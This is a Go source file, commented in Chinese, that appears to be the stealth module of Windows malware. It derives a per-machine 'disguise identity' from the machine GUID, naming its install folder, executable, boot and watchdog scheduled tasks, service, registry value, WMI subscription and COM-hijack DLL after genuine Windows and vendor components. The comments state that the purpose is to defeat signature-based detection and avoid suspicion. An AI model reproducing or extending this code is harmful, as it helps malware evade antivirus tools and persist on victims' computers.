//go:build windows

package main

import (
	"crypto/sha256"
	"fmt"
	"path/filepath"
	"sync"
)

// ═══ 动态命名系统 ═══
// 基于机器 GUID 生成唯一名称，每台机器不同，无法建立通用查杀签名
// 名称组合模拟合法 Windows 系统服务，不引起怀疑

var (
	stealthOnce   sync.Once
	stealthCached *StealthIdentity
)

// StealthIdentity 每台机器唯一的伪装身份
type StealthIdentity struct {
	Dir        string // 安装目录 C:\ProgramData\<dynamic>
	ExeName    string // 可执行文件名
	ExePath    string // 完整路径
	TaskBoot   string // 开机自启任务名
	TaskGuardA string // 看门狗 A 任务名
	TaskGuardB string // 看门狗 B 任务名
	SvcName    string // Windows 服务名
	SvcDisplay string // 服务显示名
	RegName    string // 注册表值名
	WmiName    string // WMI 订阅名
	ComDllName string // COM 代理 DLL 文件名
	ComDllPath string // COM 代理 DLL 完整路径
	ComAsmName string // COM DLL 程序集名
	ComClass   string // COM 类名
}

// 名称词库 —— 全部是 Windows 常见的系统组件命名风格
var (
	dirPrefixes = []string{"Microsoft", "Windows", "Intel", "Realtek", "AMD", "NVIDIA", "Dell", "HP"}
	dirSuffixes = []string{"NetworkService", "UpdateService", "TelemetryService", "RuntimeBroker",
		"DiagTrack", "SecurityHealth", "PlatformService", "DeviceManager",
		"FrameworkHost", "IdentityService", "CacheManager", "SyncCenter"}

	exePrefixes = []string{"svchost", "RuntimeBroker", "SecurityHealth", "WmiPrvSE",
		"SystemSettings", "SearchProtocol", "DiagTrack", "DeviceCensus",
		"MusNotify", "SIHClient", "WaasMedic", "UsoClient"}

	taskPrefixes = []string{"Microsoft\\Windows\\", "Microsoft\\", ""}
	taskMids     = []string{"WindowsUpdate", "NetworkDiagnostics", "Maintenance", "Defrag",
		"SystemSoundService", "PushNotification", "AppID", "Multimedia",
		"Customer Experience", "DiskDiagnostic", "MemoryDiagnostic", "Power Efficiency"}
	taskSuffixes = []string{"", " Agent", " Service", " Monitor", " Scheduler", " Handler"}

	svcPrefixes = []string{"Win", "Wmi", "Net", "Sys", "Usr", "App", "Sec", "Dps"}
	svcMids     = []string{"Mgmt", "Svc", "Net", "Runtime", "Diag", "Prov", "Host", "Cfg"}
	svcSuffixes = []string{"Svc", "Agent", "Mon", "Ex", "Helper", "Worker", "Broker", "Core"}
)

// pick 从列表中基于 hash 字节选择元素
func pick(list []string, b byte) string {
	return list[int(b)%len(list)]
}

// sid 快捷方式
func sid() *StealthIdentity { return getStealthID() }

// getStealthID 获取本机唯一的伪装身份（缓存，仅计算一次）
func getStealthID() *StealthIdentity {
	stealthOnce.Do(func() {
		mid, err := getMachineID()
		if err != nil {
			mid = "fallback-id"
		}

		// 用不同 salt 为每个用途生成独立 hash
		hDir := sha256.Sum256([]byte(mid + "|dir|v2"))
		hExe := sha256.Sum256([]byte(mid + "|exe|v2"))
		hTask := sha256.Sum256([]byte(mid + "|task|v2"))
		hSvc := sha256.Sum256([]byte(mid + "|svc|v2"))
		hWmi := sha256.Sum256([]byte(mid + "|wmi|v2"))
		hReg := sha256.Sum256([]byte(mid + "|reg|v2"))

		dirName := pick(dirPrefixes, hDir[0]) + " " + pick(dirSuffixes, hDir[1])
		dir := filepath.Join(`C:\ProgramData`, dirName)

		exeName := pick(exePrefixes, hExe[0]) + fmt.Sprintf("%02x", hExe[4]) + ".exe"

		// 计划任务名可以含路径分隔符（如 Microsoft\Windows\xxx）
		taskFolder := pick(taskPrefixes, hTask[0])
		taskBootName := taskFolder + pick(taskMids, hTask[1]) + pick(taskSuffixes, hTask[2])
		taskGuardAName := taskFolder + pick(taskMids, hTask[3]) + pick(taskSuffixes, hTask[4])
		taskGuardBName := taskFolder + pick(taskMids, hTask[5]) + pick(taskSuffixes, hTask[6])
		// 确保三个任务名不同
		if taskGuardAName == taskBootName {
			taskGuardAName = taskFolder + pick(taskMids, hTask[7]) + " Handler"
		}
		if taskGuardBName == taskBootName || taskGuardBName == taskGuardAName {
			taskGuardBName = taskFolder + pick(taskMids, hTask[8]) + " Scheduler"
		}

		svcName := pick(svcPrefixes, hSvc[0]) + pick(svcMids, hSvc[1]) + pick(svcSuffixes, hSvc[2])
		svcDisplay := pick(dirPrefixes, hSvc[3]) + " " + pick(taskMids, hSvc[4]) + " Service"

		wmiName := pick(svcPrefixes, hWmi[0]) + pick(svcMids, hWmi[1]) + fmt.Sprintf("%02x", hWmi[4])
		regName := pick(svcPrefixes, hReg[0]) + pick(svcMids, hReg[1]) + pick(svcSuffixes, hReg[2])

		// COM 劫持用 DLL 名称
		hCom := sha256.Sum256([]byte(mid + "|com|v2"))
		comDllName := pick(exePrefixes, hCom[0]) + fmt.Sprintf("%02x", hCom[1]) + ".dll"
		comAsmName := pick(svcPrefixes, hCom[2]) + pick(svcMids, hCom[3]) + "Lib"
		comClass := pick(svcPrefixes, hCom[4]) + pick(svcMids, hCom[5]) + "Helper"

		stealthCached = &StealthIdentity{
			Dir:        dir,
			ExeName:    exeName,
			ExePath:    filepath.Join(dir, exeName),
			TaskBoot:   taskBootName,
			TaskGuardA: taskGuardAName,
			TaskGuardB: taskGuardBName,
			SvcName:    svcName,
			SvcDisplay: svcDisplay,
			RegName:    regName,
			WmiName:    wmiName,
			ComDllName: comDllName,
			ComDllPath: filepath.Join(dir, comDllName),
			ComAsmName: comAsmName,
			ComClass:   comClass,
		}
	})
	return stealthCached
}
